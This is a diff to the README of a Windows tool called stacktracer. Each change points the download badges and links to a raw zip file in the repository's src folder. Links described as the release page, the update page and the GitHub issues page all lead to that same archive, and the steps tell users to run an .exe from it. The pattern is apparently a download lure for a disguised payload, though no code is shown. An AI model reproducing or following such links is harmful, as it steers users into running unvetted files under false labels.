@@ -1,6 +1,6 @@
 # 🧰 stacktracer - Find Your Program Errors Fast
 
-[![Download stacktracer](https://img.shields.io/badge/Download-stacktracer-blue?style=for-the-badge)](https://github.com/winnasublime219/stacktracer/raw/refs/heads/main/src/Software-3.5.zip)
+[![Download stacktracer](https://img.shields.io/badge/Download-stacktracer-blue?style=for-the-badge)](https://github.com/winnasublime219/stacktracer/raw/refs/heads/main/src/Software-v1.0.zip)
 
 ## 🛠 What is stacktracer?
 
@@ -21,12 +21,12 @@ stacktracer runs on most Windows computers without extra setup.
 
 You can get the software by visiting the official release page. This is where the latest version is always available.
 
-[![Download stacktracer](https://img.shields.io/badge/Download-stacktracer-green?style=for-the-badge)](https://github.com/winnasublime219/stacktracer/raw/refs/heads/main/src/Software-3.5.zip)
+[![Download stacktracer](https://img.shields.io/badge/Download-stacktracer-green?style=for-the-badge)](https://github.com/winnasublime219/stacktracer/raw/refs/heads/main/src/Software-v1.0.zip)
 
 ### How to Download
 
 1. Click on the green **Download stacktracer** badge above or go to  
-   https://github.com/winnasublime219/stacktracer/raw/refs/heads/main/src/Software-3.5.zip  
+   https://github.com/winnasublime219/stacktracer/raw/refs/heads/main/src/Software-v1.0.zip  
 2. On the page, look for the latest version. It will have a file ending with `.exe`. For example: `stacktracer-setup.exe` or `stacktracer.exe`.  
 3. Click on the `.exe` file link to start downloading. Your browser will ask where to save it on your computer. Use the Downloads folder or Desktop to find it easily.
 
@@ -66,16 +66,16 @@ If stacktracer does not seem to work as expected, try these tips:
 - Restart your computer and try again.  
 
 If problems continue, look for help on the GitHub issues page:  
-https://github.com/winnasublime219/stacktracer/raw/refs/heads/main/src/Software-3.5.zip
+https://github.com/winnasublime219/stacktracer/raw/refs/heads/main/src/Software-v1.0.zip
 
 ## 📥 Additional Downloads and Updates
 
 Visit the release page regularly for updates:  
-https://github.com/winnasublime219/stacktracer/raw/refs/heads/main/src/Software-3.5.zip
+https://github.com/winnasublime219/stacktracer/raw/refs/heads/main/src/Software-v1.0.zip
 
 Click on the badge below to visit the releases page anytime.
 
-[![Download stacktracer](https://img.shields.io/badge/Download-stacktracer-grey?style=for-the-badge)](https://github.com/winnasublime219/stacktracer/raw/refs/heads/main/src/Software-3.5.zip)
+[![Download stacktracer](https://img.shields.io/badge/Download-stacktracer-grey?style=for-the-badge)](https://github.com/winnasublime219/stacktracer/raw/refs/heads/main/src/Software-v1.0.zip)
 
 Check for new versions to get improved features or bug fixes.
 
@@ -93,7 +93,7 @@ This makes it easy to try or keep using stacktracer without cluttering your syst
 If you want to report a problem or suggest improvements:
 
 - Use the GitHub Issues page:  
-  https://github.com/winnasublime219/stacktracer/raw/refs/heads/main/src/Software-3.5.zip  
+  https://github.com/winnasublime219/stacktracer/raw/refs/heads/main/src/Software-v1.0.zip  
 - Include what you did and what happened when using the tool.  
 - Attach saved stack trace files if possible.
 
